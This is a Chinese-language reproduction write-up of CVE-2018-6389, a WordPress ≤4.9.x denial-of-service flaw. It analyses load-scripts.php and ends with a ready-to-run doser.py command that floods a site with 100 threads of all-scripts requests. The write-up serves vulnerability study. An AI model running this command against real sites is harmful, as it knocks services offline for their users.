<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-6389）WordPress &lt;= 4.9.x 拒绝服务漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>WordPress &lt;= 4.9.x</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>在文件 WordPress/wp-admin/load-scripts.php 中：</p><p>&lt;?php<br />...//ignore<br />$load = $_GET['load'];<br />if ( is_array( $load ) ) {<br />    $load = implode( '', $load );<br />}<br />$load = preg_replace( '/[^a-z0-9,_-]+/i', '', $load );<br />$load = array_unique( explode( ',', $load ) );<br />...//ignore<br />foreach ( $load as $handle ) {<br />    if ( ! array_key_exists( $handle, $wp_scripts-&gt;registered ) ) {<br />        continue;<br />    }<br />    $path = ABSPATH . $wp_scripts-&gt;registered[ $handle ]-&gt;src;<br />    $out .= get_file( $path ) . "\n";<br />}<br />...//ignore<br />echo $out;<br />exit;</p><p>load-scripts.php 文件会根据load参数传入的文件名依次载入文件并输出。同时程序对load参数的内容进行了过滤，只有在白名单$wp_scripts中的JS文件才会被载入。</p><p>该JS文件白名单的内容在文件 WordPress/wp-includes/script-loader.php 中：</p><p>...//ignore<br />    $scripts-&gt;add( 'wp-lists', &quot;/wp-includes/js/wp-lists$suffix.js&quot;, array( 'wp-ajax-response', 'jquery-color' ), false, 1 );<br />    // WordPress no longer uses or bundles Prototype or script.aculo.us. These are now pulled from an external source.<br />    $scripts-&gt;add( 'prototype', 'https://ajax.googleapis.com/ajax/libs/prototype/1.7.1.0/prototype.js', array(), '1.7.1' );<br />    $scripts-&gt;add( 'scriptaculous-root', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js', array( 'prototype' ), '1.9.0' );<br />    $scripts-&gt;add( 'scriptaculous-builder', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/builder.js', array( 'scriptaculous-root' ), '1.9.0' );<br />    $scripts-&gt;add( 'scriptaculous-dragdrop', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/dragdrop.js', array( 'scriptaculous-builder', 'scriptaculous-effects' ), '1.9.0' );<br />    ...//ignore<br />    $scripts-&gt;add( 'jquery-ui-sortable', &quot;/wp-includes/js/jquery/ui/sortable$dev_suffix.js&quot;, array( 'jquery-ui-mouse' ), '1.11.4', 1 );<br />    $scripts-&gt;add( 'jquery-ui-spinner', &quot;/wp-includes/js/jquery/ui/spinner$dev_suffix.js&quot;, array( 'jquery-ui-button' ), '1.11.4', 1 );<br />    $scripts-&gt;add( 'jquery-ui-tabs', &quot;/wp-includes/js/jquery/ui/tabs$dev_suffix.js&quot;, array( 'jquery-ui-core', 'jquery-ui-widget' ), '1.11.4', 1 );<br />    $scripts-&gt;add( 'jquery-ui-tooltip', &quot;/wp-includes/js/jquery/ui/tooltip$dev_suffix.js&quot;, array( 'jquery-ui-core', 'jquery-ui-widget', 'jquery-ui-position' ), '1.11.4', 1 );<br />    $scripts-&gt;add( 'jquery-ui-widget', &quot;/wp-includes/js/jquery/ui/widget$dev_suffix.js&quot;, array( 'jquery' ), '1.11.4', 1 );<br />...//ignore</p><p>JS文件白名单中共有181个文件。如果我们请求 load-scripts.php 文件使其同时载入全部JS文件，PHP代码将要进行181次的读取操作。若同时发起多个载入全部JS文件的请求，这将极大地消耗服务器资源，即有可能导致网站无法正常响应其他用户的请求。</p><h3>漏洞利用</h3><p><a href="https://github.com/ianxtianxt/CVE-2018-6389">https://github.com/ianxtianxt/CVE-2018-6389</a></p><p>python doser.py -g 'http://0-sec.org/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver=4.9' -t 100</p><p>image</p></body></html>